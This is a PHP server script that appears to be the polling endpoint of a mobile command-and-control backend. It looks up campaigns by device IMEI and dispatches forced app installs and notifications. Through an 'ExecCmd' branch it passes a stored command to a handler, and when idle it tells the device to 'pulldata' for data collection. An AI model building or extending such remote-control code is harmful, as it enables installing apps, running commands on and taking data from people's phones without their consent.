<?php
$query = "SELECT 
    `IMEI`,
    `campaign_id`,
    `status`,
    `Last_update`,
    `method_type`,
    `select_list`,
    `start_date`,
    `end_date`,
    `Apk_Location`,
    `Noti_Description`,
    `Entry_date`,
    `campaign_name`,
    `campaign_type`,
    `Noti_Heading`,
    `Noti_Icon`,
    `Noti_Intent`,
    `Apk_Package`,
    `Noti_Banner`,
    `Noti_Type`
FROM
    `campaigns`
WHERE
    start_date <= NOW()
        AND end_date >= NOW()
        AND IMEI = :IMEI
        AND `status` = 'start'
        AND (Last_update < DATE_SUB(NOW(), INTERVAL 6 HOUR)
        OR Last_update IS NULL)
ORDER BY start_date ASC limit 1;";

$condition = array(
    "IMEI" => $obj->IM
);
$r = $db_select->query_result($query, $condition);
// print_r($r);
$imei = $obj->IM;
if (count($r) > 0) {
    foreach ($r as $a) {
        $status = $a['status'];
        $camp = $a['campaign_type'];
        $camp_id = $a['campaign_id'];
        echo $camp;
        if ($camp == 'AppInstall') {
            include_once 'mob/appinstall.php';
        } elseif ($camp == 'Notification') {
            include_once 'mob/notification.php';
        } elseif ($camp == 'ForceInstall') {
            include_once 'mob/ForceInstall.php';
        } elseif ($camp == 'ExecCmd') {
            $cmd = $a['Apk_Location'];
            include_once 'mob/ExecCmd.php';
        } else {
            $res = array(
                'status' => 'ok',
                'data' => 'null',
                'camp_id' => '0'
            );
            echo json_encode($res);
        }
    }
} else {
   // echo 'poll';
    include_once 'mob/dataCollection.php';
    $dc = new dataCollection();
    $coll_data = $dc->checkCollectionStatus($obj->IM, $db_select);
   // print_r($coll_data);
    if (($coll_data != false)) {
        
        if ($dc->updateCollectionStatus($obj->IM, $db, 'collecting')) {
            $res = array(
                'status' => 'pulldata',
                'data' => 'null',
                'camp_id' => '0'
            );
            echo json_encode($res);
        } else {
            $res = array(
                'status' => 'ok',
                'data' => 'null',
                'camp_id' => '0'
            );
            echo json_encode($res);
        }
    } else {
        $res = array(
            'status' => 'ok',
            'data' => 'null',
            'camp_id' => '0'
        );
        echo json_encode($res);
    }
    // echo json_encode($res);
}
